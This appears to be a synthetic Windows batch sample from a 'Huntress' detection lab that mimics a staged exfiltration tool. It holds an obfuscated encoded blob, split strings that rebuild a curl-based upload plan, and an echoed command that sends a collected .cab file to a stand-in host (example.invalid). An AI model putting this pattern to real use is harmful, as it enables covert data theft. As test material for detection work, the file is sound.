@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|rotate_left
rem HUNTRESS-MATERIAL:==AyC7N2gruXILN2CzO3SzlyYDu2CDvycJHYspsykBmwqBmXeRn5gjO6QrH2kruvILs3YDu64TswGzlcgxmyKTGYCrGYahuxKjN2ebMuELMmmbuykjO3qDJuGLN2ErOo4aO5Kbuq4Snh6BN6CDuvKbM5q7t54LHYspsykBmwqBmWc7s0CDu2CbseILtvc7s0CDu2CbM+Kzt3crnyOLs6OztwY7L6wrM34jM3ertwSjseQDuwk7M+ipH6cru3G7ryOLM6mjvywrMXYTu6GrH5KjO4Cjsw4rM6ertyk7LyC7N2grOWkrMzmztwkjuvKTuwgrM5gjF2Cbs3Y7ryoLsxejtemDuyobO+ipH7
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "item0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl."
SeT "item1=exe|stage_count=1|graph=diamond|next_language=none|campaign_id=camp"
SeT "item2=aign-05a02ee609|source_path=C:\Users\Public\HuntressLab\collect-05a"
SeT "item3=02ee609.cab|upload_url=https://05a02ee609.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=90d6f011"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "item9=%item0%%item1%%item2%%item3%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-05a02ee609.cab to https://05a02ee609.example.invalid/upload
exit /b 0
